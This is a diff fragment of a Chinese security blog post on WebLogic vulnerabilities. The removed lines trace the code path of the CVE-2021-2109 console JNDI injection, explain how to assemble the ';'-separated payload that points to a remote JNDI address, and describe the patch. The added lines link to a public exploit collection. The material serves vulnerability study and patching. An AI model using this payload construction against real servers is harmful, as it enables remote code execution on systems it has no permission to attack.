-</div><p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204426d66e2.png" alt="image-20250506171326607" srcset="https://bu.dusays.com/2025/05/11/68204426d66e2.png?size=small, https://bu.dusays.com/2025/05/11/68204426d66e2.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204426d66e2.png?size=large 2x" data-title="image-20250506171326607" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>这里就是 <code>;</code> 而不是 <code>.</code></p>
-<p>看到 <code>\server\lib\consoleapp\webapp</code> 下的 <code>consolejndi.portal</code> ，就是我们刚才 payload 中访问的路由</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820442a1d01d.png" alt="image-20250506175245640" srcset="https://bu.dusays.com/2025/05/11/6820442a1d01d.png?size=small, https://bu.dusays.com/2025/05/11/6820442a1d01d.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820442a1d01d.png?size=large 2x" data-title="image-20250506175245640" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>具体的处理逻辑在 <code>/PortalConfig/jndi/jndibinding.portlet</code></p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820442b45d28.png" alt="image-20250506180515325" srcset="https://bu.dusays.com/2025/05/11/6820442b45d28.png?size=small, https://bu.dusays.com/2025/05/11/6820442b45d28.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820442b45d28.png?size=large 2x" data-title="image-20250506180515325" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>可以发现在 <code>com.bea.console.actions.jndi.JNDIBindingAction#execute</code> 中就是处理逻辑</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820443011a92.png" alt="image-20250506205421771" srcset="https://bu.dusays.com/2025/05/11/6820443011a92.png?size=small, https://bu.dusays.com/2025/05/11/6820443011a92.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820443011a92.png?size=large 2x" data-title="image-20250506205421771" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>先获取 jndi 上下文然后就直接 lookup 了，现在先看下怎么控制 serverMBean 了，而一直往上追溯其赋值，大概可以用下面这个赋值链表示</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">JndiBindingHandle bindingHandle = (JndiBindingHandle)this.getHandleContext(actionForm, request, &#34;JNDIBinding&#34;);
-</span></span><span class="line"><span class="cl">-&gt;
-</span></span><span class="line"><span class="cl">String serverName = bindingHandle.getServer();
-</span></span><span class="line"><span class="cl">-&gt;
-</span></span><span class="line"><span class="cl">ServerMBean serverMBean = domainMBean.lookupServer(serverName);</span></span></code></pre></td></tr></table>
-</div>
-</div><p>从 <code>domainMBean.lookupServer(serverName)</code> 开始分析，这里是动态代理调用，用的是 <code>weblogic.management.jmx.MBeanServerInvocationHandler#invoke</code></p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204430dc712.png" alt="image-20250506211514032" srcset="https://bu.dusays.com/2025/05/11/68204430dc712.png?size=small, https://bu.dusays.com/2025/05/11/68204430dc712.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204430dc712.png?size=large 2x" data-title="image-20250506211514032" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>这里 var2 就是要调用的方法 <code>weblogic.management.configuration.DomainMBean#lookupServer</code> ，var3 则是要传进去的参数，然后发现 var2 的实现类是 <code>weblogic.management.configuration.DomainMBeanImpl#lookupServer</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">ServerMBean</span><span class="w"> </span><span class="nf">lookupServer</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Iterator</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Arrays</span><span class="p">.</span><span class="na">asList</span><span class="p">((</span><span class="n">Object</span><span class="o">[]</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">_Servers</span><span class="p">).</span><span class="na">iterator</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ServerMBeanImpl</span><span class="w"> </span><span class="n">var3</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">do</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">var2</span><span class="p">.</span><span class="na">hasNext</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ServerMBeanImpl</span><span class="p">)</span><span class="n">var2</span><span class="p">.</span><span class="na">next</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">var3</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="n">var1</span><span class="p">));</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">var3</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>这里 <code>this._Servers</code> 是一组服务器对象，会依次取出其中的实例并判断其 getName 返回的值是否为我们传进去的 var1</p>
-<p>我们肯定不能返回 null，所以我们必须要让传进去的 var1 等于其 getName 值，这里只有一个实例，其 getName 返回的值为 AdminServer</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204427191db.png" alt="image-20250506213012236" srcset="https://bu.dusays.com/2025/05/11/68204427191db.png?size=small, https://bu.dusays.com/2025/05/11/68204427191db.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204427191db.png?size=large 2x" data-title="image-20250506213012236" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>因此我们传入的 var1 值为 AdminServer ，根据之前我们的赋值链可以发现 var1 就是 serverName，跟进下 getServer 方法会发现其值是可控的，会返回 getComponent 方法获得的数组中索引为 2 的值，这个方法待会分析</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    public String getServer() {
-</span></span><span class="line"><span class="cl">        return this.getComponent(2);
-</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
-</div>
-</div><p>至此 <code>c != null</code> 已经可以满足，现在看看 jndi lookup 的地址怎么控制</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820442f28dc9.png" alt="image-20250506213900415" srcset="https://bu.dusays.com/2025/05/11/6820442f28dc9.png?size=small, https://bu.dusays.com/2025/05/11/6820442f28dc9.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820442f28dc9.png?size=large 2x" data-title="image-20250506213900415" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>跟进发现其两个 getter 方法都是调用的 ，而且都是用到 getComponent 方法返回的数组</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204428d074b.png" alt="image-20250506214010067" srcset="https://bu.dusays.com/2025/05/11/68204428d074b.png?size=small, https://bu.dusays.com/2025/05/11/68204428d074b.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204428d074b.png?size=large 2x" data-title="image-20250506214010067" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>最后跟进到 <code>com.bea.console.handles.HandleImpl#getComponents()</code> ，这个方法也很简单，就是用 <code>;</code> 来分隔数组中的每个组件</p>
-<p>所以最后构造 payload 的时候就很清晰了，写三个组件，前两个是 jndi 的远程地址，最后一个为 AdminServer 就好了，用 <code>;</code> 分隔</p>
-<h4 id="漏洞修复" class="heading-element"><span>漏洞修复</span>
-  <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%ae%e5%a4%8d" class="heading-mark">
-    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
-  </a>
-</h4><p>加了个函数来判断传进 lookup 方法的值</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820442ab2c23.png" alt="image-20250506215751500" srcset="https://bu.dusays.com/2025/05/11/6820442ab2c23.png?size=small, https://bu.dusays.com/2025/05/11/6820442ab2c23.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820442ab2c23.png?size=large 2x" data-title="image-20250506215751500" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>只允许以 <code>java:</code> 开头的本地 JNDI 名称，远程的如 rmi，ldap 就不行了</p>
 <h3 id="小结-1" class="heading-element"><span>小结</span>
   <a href="#%e5%b0%8f%e7%bb%93-1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>限制比较大感觉，要进后台，漏洞本身的利用思路还是非常有趣的</p>
+</h3><p>有总的利用脚本：https://github.com/zhzyker/exphub/tree/master/weblogic</p>
+<p>都挺简单的，感觉限制比较多，不是需要版本低就是要进后台或者开启某些特殊配置，nday是这样的，也算是对 weblogic 有个简单的了解</p>
 <h3 id="参考-1" class="heading-element"><span>参考</span>
   <a href="#%e5%8f%82%e8%80%83-1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p><a href="https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/"target="_blank" rel="external nofollow noopener noreferrer">https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/</a></p>
-<p><a href="https://y4er.com/posts/weblogic-cve-2021-2109-jndi-rce/"target="_blank" rel="external nofollow noopener noreferrer">https://y4er.com/posts/weblogic-cve-2021-2109-jndi-rce/</a></p>
+</h3><p><a href="https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/"target="_blank" rel="external nofollow noopener noreferrer">https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/</a></p>
+<p><a href="https://blog.csdn.net/weixin_51198941/article/details/134193310"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/weixin_51198941/article/details/134193310</a></p>
 <h2 id="总结" class="heading-element"><span>总结</span>
   <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
